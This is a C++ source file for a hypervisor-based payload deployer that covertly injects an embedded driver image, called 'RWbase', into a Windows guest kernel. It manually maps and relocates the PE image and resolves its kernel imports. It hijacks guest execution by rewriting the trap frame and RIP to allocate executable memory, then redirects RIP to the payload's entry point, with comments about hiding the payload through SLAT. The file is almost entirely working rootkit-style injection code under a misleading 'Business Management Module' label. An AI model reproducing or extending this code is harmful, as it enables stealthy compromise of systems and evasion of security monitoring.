// =============================================================================
// VMM Shadow Mapper - Payload Deployer (Business Management Module)
// Coordinates loading of RWbase payloads
// =============================================================================

#include "deployer.h"
#include "modules/loader/pe.h"
#include "modules/loader/reloc.h"
#include "modules/loader/imports.h"
#include "modules/loader/cookie.h"
#include "modules/loader/guest.h"
#include "modules/logs/logs.h"
#include "modules/crt/crt.h"
#include "modules/memory_manager/memory_manager.h"
#include "modules/memory_manager/heap_manager.h"
#include "modules/slat/slat.h"
#include "modules/slat/cr3/cr3.h"
#include "modules/arch/arch.h"

// Include the generated payload binaries
#include <payload/payload_bin.h>

// Access to global runtime context for injection state
#include "../../runtime/runtime_context.h"

namespace loader {

// =============================================================================
// Allocation Tracking
// =============================================================================

struct allocation_info_t {
    uint64_t guest_physical_base;   // Guest physical address
    uint64_t guest_virtual_base;    // Guest kernel VA (for relocations)
    void*    vmm_mapped_address;    // VMM-accessible address for modification
    uint32_t size;                  // Allocated size
    uint32_t page_count;            // Number of 4KB pages
};

// =============================================================================
// Payload Validation
// =============================================================================

/**
 * @description 校验 Payload 是否为合法 PE64 镜像。
 * @param {const unsigned char*} data Payload 数据指针。
 * @param {const size_t} size Payload 数据大小。
 * @return {bool} 是否为合法 PE64。
 * @throws {无} 不抛出异常。
 */
bool validate_payload(const unsigned char* data, const size_t size)
{
    if (!data || size < sizeof(image_dos_header_t)) {
        return false;
    }

    const auto dos = reinterpret_cast<const image_dos_header_t*>(data);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        return false;
    }

    if (static_cast<size_t>(dos->e_lfanew) + sizeof(image_nt_headers64_t) > size) {
        return false;
    }

    const auto nt = reinterpret_cast<const image_nt_headers64_t*>(data + dos->e_lfanew);
    if (nt->signature != IMAGE_NT_SIGNATURE) {
        return false;
    }

    if (nt->optional_header.magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        return false;
    }

    return true;
}

/**
 * @description 判断内置 Payload 是否已准备就绪。
 * @return {bool} 是否准备就绪。
 */
bool is_payload_ready()
{
    return validate_payload(payload::rwbase_image, payload::rwbase_image_size);
}

// =============================================================================
// Payload Info Logging
// =============================================================================

/**
 * @description 打印 Payload 的关键信息与摘要。
 * @param {context_t*} ctx 加载器上下文。
 * @param {const char*} name Payload 名称。
 * @param {const unsigned char*} data Payload 数据指针。
 * @param {const size_t} size Payload 数据大小。
 */
void print_payload_info(context_t* ctx, const char* name, const unsigned char* data, const size_t size)
{
    logs::print(ctx->log_ctx, "[Loader] === %s Payload Info ===\n", name);
    logs::print(ctx->log_ctx, "[Loader]   Size: %d bytes\n", size);

    if (!validate_payload(data, size)) {
        logs::print(ctx->log_ctx, "[Loader]   ERROR: Invalid PE format\n");
        return;
    }

    const auto dos = reinterpret_cast<const image_dos_header_t*>(data);
    const auto nt = reinterpret_cast<const image_nt_headers64_t*>(data + dos->e_lfanew);

    logs::print(ctx->log_ctx, "[Loader]   ImageBase:     0x%p\n", nt->optional_header.image_base);
    logs::print(ctx->log_ctx, "[Loader]   EntryPoint:    0x%x\n", nt->optional_header.address_of_entry_point);
    logs::print(ctx->log_ctx, "[Loader]   SizeOfImage:   0x%x\n", nt->optional_header.size_of_image);
    logs::print(ctx->log_ctx, "[Loader]   Sections:      %d\n", nt->file_header.number_of_sections);

    // Hex dump first 64 bytes for integrity verification
    logs::print(ctx->log_ctx, "[Loader]   First 64 bytes:\n");
    logs::print(ctx->log_ctx, "[Loader]   ");
    for (size_t i = 0; i < 64 && i < size; i++) {
        if (i > 0 && i % 16 == 0) {
            logs::print(ctx->log_ctx, "\n[Loader]   ");
        }
        const uint8_t b = data[i];
        const char hex_chars[] = "0123456789ABCDEF";
        char hex[3] = { hex_chars[b >> 4], hex_chars[b & 0xF], ' ' };
        logs::print(ctx->log_ctx, "%s", hex);
    }
    logs::print(ctx->log_ctx, "\n");
}

// =============================================================================
// Guest Memory Allocation
// =============================================================================

/**
 * @description 为 Payload 分配来宾可访问的物理内存并映射到 VMM。
 * @param {context_t*} ctx 加载器上下文。
 * @param {const uint32_t} size 申请大小（字节）。
 * @param {allocation_info_t*} out_info 输出分配信息。
 * @return {bool} 是否分配成功。
 */
static bool allocate_guest_memory(
    context_t* ctx,
    const uint32_t size,
    allocation_info_t* out_info)
{
    if (!out_info || !ctx) {
        return false;
    }

    const uint32_t pages_needed = (size + 0xFFF) / 0x1000;
    
    logs::print(ctx->log_ctx, "[Loader] Allocating %d pages (%d bytes) in Guest space...\n", 
        pages_needed, size);

    void* vmm_base = heap_manager::allocate_page(ctx->heap_ctx);
    if (!vmm_base) {
        logs::print(ctx->log_ctx, "[Loader] Failed to allocate initial page\n");
        return false;
    }

    for (uint32_t i = 1; i < pages_needed; i++) {
        void* page = heap_manager::allocate_page(ctx->heap_ctx);
        if (!page) {
            logs::print(ctx->log_ctx, "[Loader] Failed to allocate page %d of %d\n", i + 1, pages_needed);
            return false;
        }
        if (reinterpret_cast<uint8_t*>(page) != 
            reinterpret_cast<uint8_t*>(vmm_base) + (i * 0x1000)) {
            logs::print(ctx->log_ctx, "[Loader] WARNING: Non-contiguous allocation\n");
        }
    }

    const uint64_t vmm_va = reinterpret_cast<uint64_t>(vmm_base);
    const uint64_t heap_va_base = reinterpret_cast<uint64_t>(
        memory_manager::map_host_physical(ctx->heap_ctx->initial_physical_base));
    
    const uint64_t guest_physical = ctx->heap_ctx->initial_physical_base + (vmm_va - heap_va_base);

    logs::print(ctx->log_ctx, "[Loader] VMM VA: 0x%p, Guest PA: 0x%p\n", vmm_va, guest_physical);

    constexpr uint64_t KERNEL_HIGH_BASE = 0xFFFF800000000000ULL;
    const uint64_t guest_va = KERNEL_HIGH_BASE | (guest_physical & 0x0000FFFFFFFFFFFFULL);

    logs::print(ctx->log_ctx, "[Loader] Guest VA (shadow): 0x%p\n", guest_va);

    out_info->guest_physical_base = guest_physical;
    out_info->guest_virtual_base = guest_va;
    out_info->vmm_mapped_address = vmm_base;
    out_info->size = size;
    out_info->page_count = pages_needed;

    return true;
}

// =============================================================================
// Section Mapping
// =============================================================================

/**
 * @description 将 PE 各节区映射到目标地址。
 * @param {void*} dest 目标地址（VMM 可写）。
 * @param {const unsigned char*} src 源镜像数据。
 * @param {const size_t} src_size 源镜像大小。
 * @return {bool} 是否映射成功。
 */
static bool map_sections(void* dest, const unsigned char* src, const size_t src_size)
{
    const auto dos = reinterpret_cast<const image_dos_header_t*>(src);
    const auto nt = reinterpret_cast<const image_nt_headers64_t*>(src + dos->e_lfanew);
    
    const uint32_t headers_size = nt->optional_header.size_of_headers;
    crt::copy_memory(dest, src, headers_size);

    const auto sections = reinterpret_cast<const image_section_header_t*>(
        reinterpret_cast<const uint8_t*>(&nt->optional_header) + 
        nt->file_header.size_of_optional_header
    );

    for (uint16_t i = 0; i < nt->file_header.number_of_sections; i++) {
        const auto& section = sections[i];

        if (section.size_of_raw_data == 0) {
            continue;
        }

        if (section.pointer_to_raw_data + section.size_of_raw_data > src_size) {
            return false;
        }

        void* dest_section = reinterpret_cast<uint8_t*>(dest) + section.virtual_address;
        const void* src_section = src + section.pointer_to_raw_data;
        
        crt::copy_memory(dest_section, src_section, section.size_of_raw_data);

        if (section.virtual_size > section.size_of_raw_data) {
            const uint32_t padding = section.virtual_size - section.size_of_raw_data;
            crt::set_memory(
                reinterpret_cast<uint8_t*>(dest_section) + section.size_of_raw_data,
                0,
                padding
            );
        }
    }

    return true;
}

// =============================================================================
// RWbase Deployment
// =============================================================================

/**
 * @description 部署 RWbase Payload 并进行 SLAT 隐藏。
 * @param {context_t*} ctx 加载器上下文。
 * @param {const uint64_t} ntoskrnl_base 来宾 ntoskrnl 基址。
 * @return {deploy_result_t} 部署结果。
 */
deploy_result_t deploy_rwbase_payload(context_t* ctx, const uint64_t ntoskrnl_base)
{
    if (!ctx) return deploy_result_t::memory_allocation_failed;

    const uint32_t current_state = ctx->deployment_state.load(std::memory_order_acquire);
    if (current_state == 2) {
        return deploy_result_t::success;
    }

    uint32_t expected_state = 0;
    if (!ctx->deployment_state.compare_exchange_strong(expected_state, 1, std::memory_order_acq_rel)) {
        if (expected_state == 2) {
            return deploy_result_t::success;
        }
        return deploy_result_t::already_in_progress;
    }

    logs::print(ctx->log_ctx, "[Loader] ========================================\n");
    logs::print(ctx->log_ctx, "[Loader] RWbase Payload Deployment Starting\n");
    logs::print(ctx->log_ctx, "[Loader] ========================================\n");

    if (!ctx->module_cache.initialized) {
        set_discovery_slat_cr3(ctx, slat::hyperv_cr3(nullptr));
        set_discovery_cr3(ctx, arch::get_guest_cr3());
        if (!init_guest_discovery(ctx, ntoskrnl_base)) {
            logs::print(ctx->log_ctx, "[Loader] WARNING: Guest discovery init failed\n");
        }
    }

    if (!validate_payload(payload::rwbase_image, payload::rwbase_image_size)) {
        logs::print(ctx->log_ctx, "[Loader] ERROR: Invalid RWbase payload\n");
        ctx->deployment_state.store(0, std::memory_order_release);
        return deploy_result_t::invalid_payload;
    }

    print_payload_info(ctx, "RWbase", payload::rwbase_image, payload::rwbase_image_size);

    const auto dos = reinterpret_cast<const image_dos_header_t*>(payload::rwbase_image);
    const auto nt = reinterpret_cast<const image_nt_headers64_t*>(
        payload::rwbase_image + dos->e_lfanew
    );
    const uint32_t image_size = nt->optional_header.size_of_image;

    allocation_info_t alloc = {};
    if (!allocate_guest_memory(ctx, image_size, &alloc)) {
        logs::print(ctx->log_ctx, "[Loader] ERROR: Failed to allocate Guest memory for RWbase\n");
        ctx->deployment_state.store(0, std::memory_order_release);
        return deploy_result_t::memory_allocation_failed;
    }

    logs::print(ctx->log_ctx, "[Loader] RWbase allocation: Guest PA=0x%p, Guest VA=0x%p, VMM=0x%p\n",
        alloc.guest_physical_base, alloc.guest_virtual_base, alloc.vmm_mapped_address);

    crt::set_memory(alloc.vmm_mapped_address, 0, image_size);

    logs::print(ctx->log_ctx, "[Loader] Mapping PE sections...\n");
    if (!map_sections(alloc.vmm_mapped_address, payload::rwbase_image, payload::rwbase_image_size)) {
        logs::print(ctx->log_ctx, "[Loader] ERROR: Failed to map sections\n");
        ctx->deployment_state.store(0, std::memory_order_release);
        return deploy_result_t::invalid_payload;
    }

    const uint64_t target_va = alloc.guest_virtual_base;

    logs::print(ctx->log_ctx, "[Loader] Fixing security cookie...\n");
    if (!fix_security_cookie(ctx, alloc.vmm_mapped_address, target_va)) {
        logs::print(ctx->log_ctx, "[Loader] WARNING: Security cookie fix failed\n");
    }

    logs::print(ctx->log_ctx, "[Loader] Applying relocations (base: 0x%p)...\n", target_va);
    if (!apply_relocations(ctx, alloc.vmm_mapped_address, target_va)) {
        logs::print(ctx->log_ctx, "[Loader] ERROR: Relocation failed\n");
        ctx->deployment_state.store(0, std::memory_order_release);
        return deploy_result_t::relocation_failed;
    }

    logs::print(ctx->log_ctx, "[Loader] Resolving imports (ntoskrnl=0x%p)...\n", ntoskrnl_base);
    if (!resolve_payload_imports(ctx, alloc.vmm_mapped_address, ntoskrnl_base)) {
        logs::print(ctx->log_ctx, "[Loader] ERROR: Import resolution failed\n");
        logs::print(ctx->log_ctx, "[Loader] Note: RWbase requires NETIO.SYS/fwpkclnt.sys imports\n");
        ctx->deployment_state.store(0, std::memory_order_release);
        return deploy_result_t::import_resolution_failed;
    }

    const uint32_t entry_rva = get_entry_point_rva(alloc.vmm_mapped_address);
    const uint64_t entry_va = target_va + entry_rva;

    logs::print(ctx->log_ctx, "[Loader] RWbase ready at EP: 0x%p (Guest VA)\n", entry_va);

    ctx->deployment_state.store(2, std::memory_order_release);
    return deploy_result_t::success;
}

// =============================================================================
// Dynamic Injection Helpers (Stage Machine Support)
// =============================================================================

bool prepare_allocation_hijack(context_t* ctx, void* trap_frame_ptr)
{
    trap_frame_t* tf = reinterpret_cast<trap_frame_t*>(trap_frame_ptr);
    auto& inject_ctx = g_runtime_context.injection_ctx;

    // 1. Resolve Allocation API if not already resolved
    if (inject_ctx.allocation_routine == 0) {
        if (g_runtime_context.ntoskrnl_base == 0) return false;
        
        inject_ctx.allocation_routine = resolve_mm_allocate_independent_pages_ex(g_runtime_context.ntoskrnl_base);
        if (inject_ctx.allocation_routine == 0) {
             logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to resolve MmAllocateIndependentPagesEx\n");
             return false;
        }
    }

    // 2. Backup Context
    crt::copy_memory(&inject_ctx.saved_guest_context, tf, sizeof(trap_frame_t));

    // 3. Prepare Arguments for MmAllocateIndependentPagesEx
    // PVOID MmAllocateIndependentPagesEx(SIZE_T NumberOfBytes, ULONG Node, ULONG64 AllocationType, ULONG64 Protect);
    
    const auto dos = reinterpret_cast<const image_dos_header_t*>(payload::rwbase_image);
    const auto nt = reinterpret_cast<const image_nt_headers64_t*>(payload::rwbase_image + dos->e_lfanew);
    const uint32_t image_size = nt->optional_header.size_of_image;

    tf->rcx = image_size;                 // NumberOfBytes (Virtual Size)
    tf->rdx = 0xFFFFFFFF;                 // Node (Current)
    tf->r8 = 0;                           // AllocationType (Normal)
    tf->r9 = 0x40;                        // Protect (PAGE_EXECUTE_READWRITE)

    // 4. Setup Stack (Shadow Space + Return Address)
    // We need to write to Guest Stack. We need to map Guest RSP to Host VA.
    // NOTE: This assumes we can access Guest RAM.
    const uint64_t guest_rsp = tf->rsp;
    const uint64_t stack_decrement = 0x28; // 32 bytes shadow + 8 bytes ret addr
    const uint64_t new_rsp = guest_rsp - stack_decrement;

    // Translate new_rsp to Host PA/VA
    virtual_address_t gva_rsp = {};
    gva_rsp.address = new_rsp;

    const uint64_t guest_pa = memory_manager::translate_guest_virtual_address(
        arch::get_guest_cr3(),
        slat::hyperv_cr3(&g_runtime_context.slat_ctx), 
        gva_rsp
    );

    if (guest_pa == 0) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to translate Guest RSP\n");
        return false;
    }

    void* host_stack_ptr = memory_manager::map_guest_physical(
        slat::hyperv_cr3(&g_runtime_context.slat_ctx),
        guest_pa
    );
    if (!host_stack_ptr) {
         logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to map Guest Stack\n");
         return false;
    }

    // Write Magic Trap Return Address
    *reinterpret_cast<uint64_t*>(host_stack_ptr) = injection_ctx_t::MAGIC_TRAP_RIP;

    // 5. Update Trap Frame
    tf->rsp = new_rsp;
    arch::set_guest_rip(inject_ctx.allocation_routine);

    logs::print(ctx->log_ctx, "[Injection] Stage 1: Hijacked execution for Allocation. RIP=0x%p\n", inject_ctx.allocation_routine);
    return true;
}

bool harvest_allocation_result(context_t* ctx, void* trap_frame_ptr)
{
    trap_frame_t* tf = reinterpret_cast<trap_frame_t*>(trap_frame_ptr);
    auto& inject_ctx = g_runtime_context.injection_ctx;

    // 1. Capture Result
    const uint64_t allocated_base = tf->rax;
    inject_ctx.allocated_buffer = allocated_base;
    
    logs::print(ctx->log_ctx, "[Injection] Stage 2: Allocation captured. Base=0x%p\n", allocated_base);

    // 2. Restore Context
    // We only restore non-volatile registers and control registers?
    // Actually, we should restore everything to be safe, as if the hijack never happened.
    // BUT, we must preserve the Guest's state changes IF they were relevant?
    // No, we want to resume the ORIGINAL interrupted flow transparently.
    crt::copy_memory(tf, &inject_ctx.saved_guest_context, sizeof(trap_frame_t));

    logs::print(ctx->log_ctx, "[Injection] Stage 2: Context restored. Resuming original flow.\n");
    return true;
}

bool execute_payload_hijack(context_t* ctx, void* trap_frame_ptr)
{
    trap_frame_t* tf = reinterpret_cast<trap_frame_t*>(trap_frame_ptr);
    auto& inject_ctx = g_runtime_context.injection_ctx;

    if (inject_ctx.allocated_buffer == 0) return false;

    // 1. Get Image Info
    const auto dos = reinterpret_cast<const image_dos_header_t*>(payload::rwbase_image);
    const auto nt = reinterpret_cast<const image_nt_headers64_t*>(payload::rwbase_image + dos->e_lfanew);
    const uint32_t image_size = nt->optional_header.size_of_image;

    // 2. Allocate Temp Host Buffer (Must be contiguous for fixups)
    const uint32_t pages_needed = (image_size + 0xFFF) / 0x1000;
    void* temp_buffer = heap_manager::allocate_page(ctx->heap_ctx);
    if (!temp_buffer) return false;

    // Try to allocate contiguous pages
    bool contiguous = true;
    for (uint32_t i = 1; i < pages_needed; i++) {
        void* page = heap_manager::allocate_page(ctx->heap_ctx);
        if (!page) { contiguous = false; break; }
        if (reinterpret_cast<uint8_t*>(page) != reinterpret_cast<uint8_t*>(temp_buffer) + (i * 0x1000)) {
            contiguous = false;
        }
    }

    if (!contiguous) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to allocate contiguous temp buffer\n");
        // Leak for now or implement proper cleanup
        return false;
    }

    // 3. Map Sections to Temp Buffer
    crt::set_memory(temp_buffer, 0, image_size);
    if (!map_sections(temp_buffer, payload::rwbase_image, payload::rwbase_image_size)) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to map sections\n");
        return false;
    }

    const uint64_t target_va = inject_ctx.allocated_buffer;

    // 4. Fix Security Cookie
    if (!fix_security_cookie(ctx, temp_buffer, target_va)) {
        logs::print(ctx->log_ctx, "[Injection] WARNING: Cookie fix failed\n");
    }

    // 5. Apply Relocations
    if (!apply_relocations(ctx, temp_buffer, target_va)) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Relocation failed\n");
        return false;
    }

    // 6. Resolve Imports
    if (!resolve_payload_imports(ctx, temp_buffer, g_runtime_context.ntoskrnl_base)) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Import resolution failed\n");
        return false;
    }

    // 7. Copy to Guest Memory
    const uint64_t start_va = inject_ctx.allocated_buffer;
    
    for(uint64_t i=0; i < pages_needed; i++) {
        uint64_t curr_va = start_va + (i * 0x1000);
        
        virtual_address_t gva = {};
        gva.address = curr_va;

        uint64_t guest_pa = memory_manager::translate_guest_virtual_address(
            arch::get_guest_cr3(),
            slat::hyperv_cr3(&g_runtime_context.slat_ctx), 
            gva
        );
        
        if (guest_pa == 0) {
            logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to translate allocated buffer VA 0x%p\n", curr_va);
            return false;
        }

        void* host_ptr = memory_manager::map_guest_physical(
            slat::hyperv_cr3(&g_runtime_context.slat_ctx),
            guest_pa
        );

        if (!host_ptr) {
             logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to map allocated buffer PA 0x%p\n", guest_pa);
             return false;
        }

        // Copy page from temp buffer
        crt::copy_memory(host_ptr, reinterpret_cast<uint8_t*>(temp_buffer) + (i * 0x1000), 0x1000);
    }

    // 8. Free Temp Buffer
    for(uint32_t i=0; i < pages_needed; i++) {
        heap_manager::free_page(ctx->heap_ctx, reinterpret_cast<uint8_t*>(temp_buffer) + (i * 0x1000));
    }

    // 9. Set RIP to EntryPoint
    const uint64_t entry_va = start_va + nt->optional_header.address_of_entry_point;
    arch::set_guest_rip(entry_va);
    
    // 10. Clear TF (Trap Flag)
    arch::set_guest_rflags(arch::get_guest_rflags() & ~0x100); // Clear TF (Bit 8)

    logs::print(ctx->log_ctx, "[Injection] Stage 3: Payload deployed. Hijacking RIP to 0x%p\n", entry_va);
    return true;
}

} // namespace loader